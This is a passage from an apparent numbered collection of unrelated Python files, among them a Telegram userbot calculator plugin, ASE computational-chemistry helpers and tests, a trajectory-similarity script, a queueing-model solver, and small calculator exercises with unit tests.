\".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    if e.client._bot:\n        return await e.reply(\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(\"Error\", cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "204": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "205": "from __future__ import print_function\nimport numpy as np\n\nimport logging\nlog = logging.getLogger('Jacapo')\n\nimport ase.dft.kpoints\nfrom ase.utils import basestring\n\n\n'''\nprovides functions to determine if an input parameter has changed.\n'''\n\n#######################################################################\n#### changed functions\n\ndef kpts_changed(calc, x):\n    '''\n    check if kpt grid has changed.\n\n    we have to take care to generate the right k-points from x if\n    needed. if a user provides (4,4,4) we need to generate the MP\n    grid, etc...\n\n    Since i changed the MP code in set_kpts, there is some\n    incompatibility with old jacapo calculations and their MP\n    grids.\n    '''\n    #chadi-cohen\n    if isinstance(x, basestring):\n        listofkpts = getattr(ase.dft.kpoints, x)\n    #monkhorst-pack grid\n    elif np.array(x).shape == (3,):\n        from ase.dft.kpoints import monkhorst_pack\n        N1, N2, N3 = x\n        listofkpts = monkhorst_pack((N1, N2, N3))\n    #user-defined list is provided\n    elif len(np.array(x).shape) == 2:\n        listofkpts = np.array(x)\n    else:\n        raise Exception('apparent invalid setting for kpts')\n\n    grid = calc.get_kpts()\n\n    if grid.shape != listofkpts.shape:\n        return True\n\n    if (abs(listofkpts - grid) < 1e-6).all():\n        return False\n    else:\n        return True\n\ndef electronic_minimization_changed(calc, x):\n    myx = calc.get_electronic_minimization()\n\n    for key in myx:\n        if myx[key] != x[key]:\n            print(key, myx[key], ' changed to ', x[key])\n            return True\n    return False\n\ndef spinpol_changed(calc, x):\n    if x != calc.get_spinpol():\n        return True\n    else:\n        return False\n\ndef symmetry_changed(calc, x):\n    if x != calc.get_symmetry():\n        return True\n    else:\n        return False\n\ndef xc_changed(calc, x):\n    if x != calc.get_xc():\n        return True\n    return False\n\ndef calculate_stress_changed(calc, x):\n    if x != calc.get_calculate_stress():\n        return True\n    return False\n\ndef ados_changed(calc, x):\n    ados = calc.get_ados()\n\n    #ados may not be defined, and then None is returned\n    if ados is None and x is None:\n        return False\n    elif ados is None and x is not None:\n        return True\n    elif ados is not None and x is None:\n        return True\n\n    #getting here means ados and x are not none so we compare them\n    for key in x:\n        try:\n            if x[key] != ados[key]:\n                return True\n        except ValueError:\n            if (x[key] != ados[key]).all():\n                return True\n    return False\n\ndef convergence_changed(calc, x):\n    conv = calc.get_convergence()\n    for key in x:\n        if x[key] != conv[key]:\n            return True\n    return False\n\ndef charge_mixing_changed(calc, x):\n    cm = calc.get_charge_mixing()\n    if x is None and cm is None:\n        return False\n    else:\n        return True\n\n    for key in x:\n        if x[key] != cm[key]:\n            return True\n    return False\n\ndef decoupling_changed(calc, x):\n    pars = calc.get_decoupling()\n    for key in x:\n        if x[key] != pars[key]:\n            return True\n    return False\n\ndef dipole_changed(calc, x):\n\n    pars = calc.get_dipole() #pars stored in calculator\n\n    # pars = False if no dipole variables exist\n    # XXX fix the \"logic\" below.   \"if not pars and not x\"\n    # or can it be very different types?  This is very difficult to read\n    if (pars is False and x is False):\n        return False #no change\n    elif (pars is False and x is not False):\n        return True\n\n    # both x and pars is a dictionary\n    # XXX wtf?  type(dict) == dict.  If x is a dict then type(x) is at least\n    if (isinstance(pars, type(dict)) and\n        isinstance(pars, type(x))):\n        for key in x:\n            if key == 'position':    # dipole layer position is never written to the nc file\n                print('need to do something special')\n                continue\n            if x[key] != pars[key]:\n                return True\n\n    #nothing seems to have changed.\n    return False\n\ndef extpot_changed(calc, x):\n    extpot = calc.get_extpot()\n    if (x == extpot).all():\n        return False\n    return True\n\ndef fftgrid_changed(calc, x):\n    # validkeys = ['soft', 'hard']\n\n    myx = calc.get_fftgrid()\n    if (myx['soft'] == x['soft'] and myx['hard'] == x['hard']):\n        return False\n    else:\n        return True\n\ndef ncoutput_changed(calc, x):\n    ncout = calc.get_ncoutput()\n    for key in x:\n        if x[key] != ncout[key]:\n            return True\n    return False\n\ndef nbands_changed(calc, x):\n    if calc.get_nbands() == x:\n        return False\n    else:\n        return True\n\ndef occupationstatistics_changed(calc, x):\n    if calc.get_occupationstatistics() == x:\n        return False\n    else:\n        return True\n\ndef pw_changed(calc, x):\n    if calc.get_pw() == x:\n        return False\n    else:\n        return True\n\ndef dw_changed(calc, x):\n    if calc.get_dw() == x:\n        return False\n    else:\n        return True\n\ndef ft_changed(calc, x):\n    if calc.get_ft() == x:\n        return False\n    else:\n        return True\n\ndef mdos_changed(calc,x):\n\n    myx = calc.get_mdos()\n\n    log.debug('myx = %s' % str(myx))\n    log.debug('x = %s' % str(x))\n\n    if x is None and myx is None:\n        return False\n    elif ((x is None and myx is not None)\n        or (x is not None and myx is None)):\n        return True\n    else:\n        for key in x:\n            if x[key] != myx[key]:\n                return True\n    return False\n\ndef pseudopotentials_changed(calc,x):\n\n    mypsp = calc.get_pseudopotentials()\n\n    if len(mypsp) != len(x):\n        return True\n\n    for key in x:\n        if key not in mypsp:\n            return True\n        if mypsp[key] != x[key]:\n            return True\n\n    for key in mypsp:\n        if key not in x:\n            return True\n        if mypsp[key] != x[key]:\n            return True\n    return False\n\ndef status_changed(calc,x):\n    if calc.get_status() != x:\n        return True\n    return False\n", "206": "def test_vasp_charge(require_vasp):\n    \"\"\"\n    Run VASP tests to ensure that determining number of electrons from\n    user-supplied charge works correctly. This is conditional on the existence\n    of the VASP_COMMAND or VASP_SCRIPT environment variables.\n\n    \"\"\"\n\n    import pytest\n    from ase.build import bulk\n    from ase.calculators.vasp import Vasp\n    from ase.test.calculator.vasp import installed\n\n    assert installed()\n\n    system = bulk('Al', 'fcc', a=4.5, cubic=True)\n\n    # Dummy calculation to let VASP determine default number of electrons\n    calc = Vasp(xc='LDA', nsw=-1, ibrion=-1, nelm=1, lwave=False, lcharg=False)\n    calc.calculate(system)\n    default_nelect_from_vasp = calc.get_number_of_electrons()\n    assert default_nelect_from_vasp == 12\n\n    # Make sure that no nelect was written into INCAR yet (as it wasn't necessary)\n    calc = Vasp()\n    calc.read_incar()\n    assert calc.float_params['nelect'] is None\n\n    # Compare VASP's output nelect from before minus charge to default nelect\n    # determined by us minus charge\n    charge = -2\n    calc = Vasp(xc='LDA', nsw=-1, ibrion=-1, nelm=1, lwave=False, lcharg=False,\n                charge=charge)\n    calc.initialize(system)\n    calc.write_input(system)\n    calc.read_incar()\n    assert calc.float_params['nelect'] == default_nelect_from_vasp - charge\n\n    # Test that conflicts between explicitly given nelect and charge are detected\n    with pytest.raises(ValueError):\n        calc = Vasp(xc='LDA', nsw=-1, ibrion=-1, nelm=1, lwave=False, lcharg=False,\n                    nelect=default_nelect_from_vasp-charge+1,\n                    charge=charge)\n        calc.calculate(system)\n\n    # Test that nothing is written if charge is 0 and nelect not given\n    calc = Vasp(xc='LDA', nsw=-1, ibrion=-1, nelm=1, lwave=False, lcharg=False,\n                charge=0)\n    calc.initialize(system)\n    calc.write_input(system)\n    calc.read_incar()\n    assert calc.float_params['nelect'] is None\n\n    # Test that explicitly given nelect still works as expected\n    calc = Vasp(xc='LDA', nsw=-1, ibrion=-1, nelm=1, lwave=False, lcharg=False,\n                nelect=15)\n    calc.calculate(system)\n    assert calc.get_number_of_electrons() == 15\n", "207": "import pytest\nfrom ase.build import bulk\nfrom ase.test.factories import ObsoleteFactoryWrapper\n\n\nomx_par = {'definition_of_atomic_species': [['Al', 'Al8.0-p1', 'Al_CA13'],\n                                            ['O', 'O6.0-p1', 'O_CA13']]}\n\n\nrequired = {'aims': dict(sc_accuracy_rho=5.e-3)}\n\n\ncalc = pytest.mark.calculator\n@calc('abinit', ecut=200, toldfe=0.0001, chksymbreak=0)\n@calc('openmx', **omx_par)\n@calc('elk', rgkmax=5.0)\ndef test_al(factory):\n    run(factory)\n\n@pytest.mark.parametrize('name', sorted(required))\ndef test_al_old(name):\n    factory = ObsoleteFactoryWrapper(name)\n    run(factory)\n\n\ndef run(factory):\n    name = factory.name\n    par = required.get(name, {})\n    # What on earth does kpts=1.0 mean?  Was failing, I changed it.  --askhl\n    # Disabled GPAW since it was failing anyway. --askhl\n    kpts = [2, 2, 2]\n    calc = factory.calc(label=name, xc='LDA', kpts=kpts, **par)\n    al = bulk('AlO', crystalstructure='rocksalt', a=4.5)\n    al.calc = calc\n    e = al.get_potential_energy()\n    calc.set(xc='PBE', kpts=kpts)\n    epbe = al.get_potential_energy()\n    print(e, epbe)\n    calc = factory.calc(restart=name)\n    print(calc.parameters, calc.results, calc.atoms)\n    assert not calc.calculation_required(al, ['energy'])\n    al = calc.get_atoms()\n    print(al.get_potential_energy())\n    label = 'dir/' + name + '-2'\n    calc = factory.calc(label=label, atoms=al, xc='LDA', kpts=kpts,\n                        **par)\n    print(al.get_potential_energy())\n", "208": "import numpy as np\nimport pandas as pd\nimport sys\nimport dtw\nimport sspd\nimport edr\nimport erp\nimport lcss\nimport sowd\nimport basic_euclidean as euclidean\nimport frechet\nfrom L_anonymity import anonymity\n\n\ndef trajectory_similirity_compute(traj_A, traj_B):\n    ######## Sequence-only and Discrete ########\n    # x, y, zero, h, time : 3\n    # ED - Euclidean distance calc\n    edResult, edCalcTime= euclidean.ed_traj(traj_A, traj_B)\n    print (\"ED Distance: \" + str(edResult) + \" calcTime : \" + str(edCalcTime))\n\n    # DTW - Dynamic Time Warping calc\n    dtwResult, dtwCalcTime = dtw.e_dtw(traj_A, traj_B)\n    print (\"DTW Distance: \" + str(dtwResult) + \" calcTime : \" + str(dtwCalcTime))\n    # ERP  - Edit distance with Real Penalty\n    # g (gap) : parameter defalut value 0\n    erpResult, erpCalcTime = erp.e_erp(traj_A, traj_B, 0)\n    print (\"ERP Distance: \" + str(erpResult) + \" calcTime : \" + str(erpCalcTime))\n    # EDR - Edit Distance on Real Sequence\n    # esp : subcost(p1, p2) = 0 , d(p1, p2) \u2264 \u03b5 \n    #                         1, otherwise\n    edrResult, edrCalcTime = edr.e_edr(traj_A, traj_B, 0.1)\n    print (\"EDR Distance: \" + str(edrResult) + \" calcTime : \" + str(edrCalcTime))\n    # LCSS - Longuest Common Sebsequence dtwCalcTime\n    # esp : subcost(p1, p2) = 0 , d(p1, p2) \u2264 \u03b5 \n    #                         1, otherwise\n    lcssResult, lcssCalcTime = lcss.e_lcss(traj_A, traj_B, 0.1)\n    print (\"LCSS Distance: \" + str(lcssResult) + \" calcTime : \" + str(lcssCalcTime))\n    # SSPD - Symmetric Segment-Path Distance calc\n    sspdResult, sspdCalcTime = sspd.e_sspd(traj_A, traj_B)\n    print (\"SSPD Distance: \" + str(sspdResult) + \" calcTime : \" + str(sspdCalcTime))\n    ######## Sequence-only and Continuous ########\n    # OWD - One-Way Distance calc\n    sowdResult, sowdCalcTime = sowd.sowd_grid(traj_A, traj_B)\n    print (\"OWD Distance: \" + str(sowdResult) + \" calcTime : \" + str(sowdCalcTime))\n    ######## Spatial-temporal and Discrete ########\n\n    ######## Spatial-temporal and Continuous ########\n    # Frechet dtwCalcTime\n    frechetResult, frechetCalcTime = frechet.frechet(traj_A, traj_B)\n    print (\"Frechet Distance: \" + str(frechetResult) + \" calcTime : \" + str(frechetCalcTime))\n    df = pd.DataFrame([\n        ['ED',edResult, edCalcTime],['DTW',dtwResult, dtwCalcTime]\n        ,['ERP', erpResult, erpCalcTime], ['EDR', edrResult, edrCalcTime]\n        ,['LCSS', lcssResult, lcssCalcTime],['SSPD', sspdResult, sspdCalcTime]\n        ,['OWD', sowdResult, sowdCalcTime],['Frechet', frechetResult, frechetCalcTime]]\n        ,columns=['Name','Distance', 'Time'])\n    return df\n\ndef getArrays(filename, skip_header):\n    traj_list = np.genfromtxt(filename, delimiter=',', skip_header=skip_header)\n    return np.array(traj_list)\n\n\ndef main():\n    if len(sys.argv) < 3:\n        print('You must input two filename to compare!')\n        sys.exit(1)  # abort because of error\n\n    filename1 = str(sys.argv[1])\n    filename2 = str(sys.argv[2])\n\n    ##### non-Anonymized calculation ########\n    traj_A = getArrays(filename1, 7)\n    traj_B = getArrays(filename2, 7)\n\n    selection = np.array([True, True, False, False, False, False, False])\n    traj_A = traj_A[:, selection]\n    traj_B = traj_B[:, selection]\n    result = trajectory_similirity_compute(traj_A, traj_B)\n    result.to_csv('result.csv', index=True, header=True)\n    ##### Anonymized calculation ########\n    k_file1 = anonymity(filename1)\n    k_file2 = anonymity(filename2)\n\n    k_traj_A = getArrays(k_file1, 0)\n    k_traj_B = getArrays(k_file2, 0)\n    selection = np.array([True, True, False, False])\n    k_traj_A = k_traj_A[:, selection]\n    k_traj_B = k_traj_B[:, selection]\n    result = trajectory_similirity_compute(k_traj_A, k_traj_B)\n    result.to_csv('result_any.csv', index=True, header=True)\n\nmain()\n\n\n\n\n\n\n\n\n", "209": "# type: ignore\nfrom ase.calculators.turbomole import Turbomole\nfrom ase.build import molecule\n\ndef test_turbomole_h2o():\n    mol = molecule('H2O')\n\n    params = {\n        'title': 'water',\n        'task': 'geometry optimization',\n        'use redundant internals': True,\n        'basis set name': 'def2-SV(P)',\n        'total charge': 0,\n        'multiplicity': 1,\n        'use dft': True,\n        'density functional': 'b3-lyp',\n        'use resolution of identity': True,\n        'ri memory': 1000,\n        'force convergence': 0.001,\n        'geometry optimization iterations': 50,\n        'scf iterations': 100\n    }\n\n    calc = Turbomole(**params)\n    mol.calc = calc\n    calc.calculate(mol)\n    assert calc.converged\n\n    # use the get_property() method\n    print(calc.get_property('energy', mol, False))\n    print(calc.get_property('forces', mol, False))\n    print(calc.get_property('dipole', mol, False))\n\n    # use the get_results() method\n    results = calc.get_results()\n    print(results['molecular orbitals'])\n\n    # use the __getitem__() method\n    print(calc['results']['molecular orbitals'])\n    print(calc['results']['geometry optimization history'])\n\n    # perform a normal mode calculation with the optimized structure\n\n    params.update({\n        'task': 'normal mode analysis',\n        'density convergence': 1.0e-7\n    })\n\n    calc = Turbomole(**params)\n    mol.calc = calc\n    calc.calculate(mol)\n\n    print(calc['results']['vibrational spectrum'])\n    print(calc.todict(skip_default=False))\n", "210": "from lab2 import C\n\nclass Solver2:\n\n    def __init__(self, a, b, n, r):\n        assert 0 < a < 1 and 0 < b < 1 <= n and r >= 1\n        self.a = a\n        self.b = b\n        self.inA = 1 - a\n        self.inB = 1 - b\n        self.n = n\n        self.r = r\n        self.R = n + r\n        self.count = 0\n        self.q = [None for i in range(n+r+1)]\n        self.q[n+r] = 1\n\n    # -------------------------1st----------------------------\n\n    def calc_pij(self, i, j):\n\n        if i == j == self.R:\n            return self.inB**self.n + self.a*self.n*self.inB**(self.n-1)*self.b\n        elif j == i+1 and self.n <= i <= self.R-1:\n            return self.a*self.inB**self.n\n        elif i - self.n + 1 <= j <= min(i, self.R-1) and self.n <= i <= self.R:\n            return self.inA*C(self.n, i-j)*self.inB**(self.n-i+j)*self.b**(i-j) + self.a*C(self.n, i-j+1)*self.inB**(self.n-i+j-1)*self.b**(i-j+1)\n        elif self.n <= i <= self.R and j == i - self.n:\n            return self.inA*self.b**self.n\n        elif 0 <= i <= self.n - 1 and j == i + 1:\n            return self.a*self.inB**i\n        elif self.n - 1 >= i >= 0 == j:\n            return self.inA*self.b**i\n        elif 1 <= i <= self.n - 1 and 1 <= j <= i:\n            return self.inA*C(i, j)*self.inB**j*self.b**(i-j) + self.a*C(i, j-1)*self.inB**(j-1)*self.b**(i-j+1)\n\n    def calc_qi(self, i):\n        if self.q[i]:\n            if self.q[i-1]:\n                return self.q[i]\n            else:\n                if self.r >= i >= 1:\n                    summ = 0\n                    for j in range(i+1, i+self.n+1):\n                        summ += self.calc_pij(j, i)*self.calc_qi(j)\n                    self.q[i-1] = ((1 - self.calc_pij(i, i))*self.q[i] - summ) / self.calc_pij(i-1, i)\n                elif self.R >= i >= self.r+1:\n                    summ = 0\n                    for j in range(i+1, self.R+1):\n                        summ += self.calc_pij(j, i)*self.calc_qi(j)\n                    self.q[i-1] = ((1 - self.calc_pij(i, i))*self.q[i] - summ) / self.calc_pij(i-1, i)\n                return self.q[i]\n        else:\n            self.calc_qi(i+1)\n            return self.calc_qi(i)\n\n    def calc_pi(self, i):\n        if i == self.R:\n            summ = 0\n            for k in range(0, self.R):\n                summ += self.calc_qi(k)\n            return 1 / (1 + summ)\n        else:\n            return self.calc_pi(self.R)*self.calc_qi(i)\n\n    def calc_pxij(self, i, j):\n        if self.n <= i <= self.R and i - self.n <= j <= i:\n            return C(self.n, i-j)*self.inB**(self.n-i+j)*self.b**(i-j)\n        elif 0 <= i <= self.n - 1 and 0 <= j <= i:\n            return C(i, j)*self.inB**j*self.b**(i-j)\n\n    def calc_pxi(self, i):\n        if self.r+1 <= i <= self.R:\n            summ = 0\n            for j in range(i, self.R+1):\n                summ += self.calc_pi(j) * self.calc_pxij(j, i)\n        elif 0 <= i <= self.r:\n            summ = 0\n            for j in range(i, i+self.n+1):\n                summ += self.calc_pi(j) * self.calc_pxij(j, i)\n        else:\n            summ = 'errrrrrror'\n        return summ\n\n    def calc_special_pi(self):\n        return self.calc_pxi(self.R)\n\n    def calc_wxij(self, i, j):\n        if i == 1:\n            if 0 <= j <= self.n:\n                return C(self.n, j)*self.b**j*self.inB**(self.n-j)\n            else:\n                return 0\n        else:\n            if 0 <= j <= i*self.n and i >= 2:\n                return C(i*self.n, j)*self.b**j*self.inB**(self.n*i-j)\n            else:\n                return 0\n\n    def calc_wij(self,i, j):\n        if i == 1:\n            summ = 0\n            for k in range(j+1, 1000):\n                summ += self.calc_wxij(1, k)\n            return summ\n        else:\n            summ = 0\n            for k in range(j+1):\n                summ += self.calc_wxij(i-1, k) * self.calc_wij(1, j-k)\n            return summ\n\n    def calc_wi(self, i):\n        if i == 0:\n            summ = 0\n            for j in range(self.n):\n                summ += self.calc_pxi(j)\n            return summ / (1 - self.calc_special_pi())\n        else:\n            summ = 0\n            for j in range(self.n, self.R):\n                summ += self.calc_pxi(j) * self.calc_wij(i, j-self.n)\n            return summ / (1 - self.calc_special_pi())\n\n    # -------------------------2nd----------------------------\n    def calc_N(self):\n        summ = 0\n        for i in range(self.R+1):\n            summ += i * self.calc_pi(i)\n        return summ\n\n    def calc_Nx(self):\n        summ = 0\n        for i in range(self.R+1):\n            summ += i* self.calc_pxi(i)\n        return summ\n\n    def calc_VarN(self):\n        summ = 0\n        for i in range(self.R+1):\n            summ += (i - self.calc_N)**2*self.calc_pi(i)\n        return summ\n\n    def calc_VarNx(self):\n        summ = 0\n        for i in range(self.R+1):\n            summ += (i + self.calc_Nx())**2*self.calc_pi(i)\n        return summ\n\n    def calc_w(self):\n        summ = 0\n        for i in range(1000):\n            summ += i * self.calc_wi(i)\n        return summ\n\n    def calc_Dw(self):\n        summ = 0\n        w = self.calc_w()\n        for i in range(1000):\n            summ += (i - w)**2*self.calc_wi(i)\n        return summ\n", "211": "import re\n\ndef do_calc (calc_list):\n    result = calc_list[0]\n    calc_list = calc_list[1:]\n    while calc_list:\n        if calc_list[0] == \"*\":\n            result = result * calc_list[1]\n        else:\n            result = result + calc_list[1]\n        calc_list = calc_list[2:]\n    return result\n\n\ndef do_calc_2 (calc_list):\n    while \"+\" in calc_list:\n        op_index = calc_list.index(\"+\")\n        calc_list = calc_list[:op_index-1] + [calc_list[op_index-1] + calc_list[op_index+1]] + calc_list[op_index+2:]\n    while \"*\" in calc_list:\n        op_index = calc_list.index(\"*\")\n        calc_list = calc_list[:op_index-1] + [calc_list[op_index-1] * calc_list[op_index+1]] + calc_list[op_index+2:]\n    return calc_list[0]\n\n\ndef parse_calc(calc, func):\n    input = [a if a in \"()*+\" else int(a) for a in re.findall(\"\\d+|[*+()]\", calc)]\n    while \")\" in input:\n        end_index = input.index(\")\")\n        start_index = end_index - input[:end_index][::-1].index(\"(\")\n        result = func(input[start_index:end_index])\n        input = input[:start_index-1] + [result] + input[end_index+1:]\n    return func (input)\n\n\nwith open(\"day18.txt\", \"r\") as f:\n    calcs = f.read().splitlines()\n\nprint (sum([parse_calc(c, do_calc) for c in calcs]))\nprint (sum([parse_calc(c, do_calc_2) for c in calcs]))\n", "212": "\"\"\" String Calculator tests \"\"\"\n\nimport unittest\nimport string_calculator as calc\n\nclass FirstStepTests(unittest.TestCase):\n    def test_empty_string_input(self):\n        self.assertEqual(0, calc.add(\"\"))\n        self.assertEqual(0, calc.add(\" \"))\n\n    def test_one_string_input(self):\n        self.assertEqual(1, calc.add(\"1\"))\n        self.assertEqual(2, calc.add(\"2\"))\n\n    def test_two_string_input(self):\n        self.assertEqual(3, calc.add(\"1,2\"))\n        self.assertEqual(6, calc.add(\"2,4\"))\n\n\nclass SecondStepTests(unittest.TestCase):\n    def test_unknown_amount_input(self):\n        self.assertEqual(6, calc.add(\"1,2,3\"))\n        self.assertEqual(4, calc.add(\"1,1,1,1\"))\n        self.assertEqual(6, calc.add(\"1,1,1,1,2\"))\n\n\nclass ThirdStepTests(unittest.TestCase):\n    def test_newline_between_numbers_input(self):\n        self.assertEqual(6, calc.add(\"1\\n2,3\"))\n        self.assertEqual(6, calc.add(\"1,2\\n3\"))\n        self.assertEqual(12, calc.add(\"1,2\\n3\\n1,2,3\"))\n\n\nclass FourthStepTests(unittest.TestCase):\n    def test_different_delimiters(self):\n        self.assertEqual(3, calc.add(\"//;\\n1;2\"))\n        self.assertEqual(6, calc.add(\"//;\\n1;2\\n3\"))\n        self.assertEqual(6, calc.add(\"//;1;2\\n3\"))\n        self.assertEqual(6, calc.add(\"//;1\\n2\\n3\"))\n\n\nclass FifthStepTests(unittest.TestCase):\n    def test_with_negative_number(self):\n        with self.assertRaises(Exception) as context:\n            calc.add(\"//;\\n-1\")\n        self.assertTrue(\"Negatives not allowed: -1\" in str(context.exception))\n\n\nclass SixthStepTests(unittest.TestCase):\n    def test_with_several_negative_numbers(self):\n        with self.assertRaises(Exception) as context:\n            calc.add(\"//;\\n-1;-2\")\n        self.assertTrue(\"Negatives not allowed: [-1, -2]\" in str(context.exception))\n\n\nclass SeventhStepTests(unittest.TestCase):\n    def test_numbers_bigger_than(self):\n        self.assertEqual(2, calc.add(\"//;\\n1001;2\"))\n        self.assertEqual(1002, calc.add(\"//;\\n1000;2\"))\n        self.assertEqual(2, calc.add(\"//;\\n2;1001\"))\n        self.assertEqual(6, calc.add(\"//;\\n2;1001;1;3\"))\n\n\nclass EighthStepTests(unittest.TestCase):\n    def test_any_length_delimiter(self):\n        self.assertEqual(6, calc.add(\"//[***]\\n1***2***3\"))\n        self.assertEqual(10, calc.add(\"//[+]\\n1+2+3+4\"))\n        self.assertEqual(10, calc.add(\"//[..]\\n1..2\\n3..4\"))\n\n\nclass NinthStepTests(unittest.TestCase):\n    def test_multiple_delimiters(self):\n        self.assertEqual(6, calc.add(\"//[*][%]\\n1*2%3\"))\n        self.assertEqual(10, calc.add(\"//[a][x][..]\\n1a2..3x4\"))\n\n\nunittest.main()", "213": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"Temporary program, draw OBC 2-dim and 3-dim data 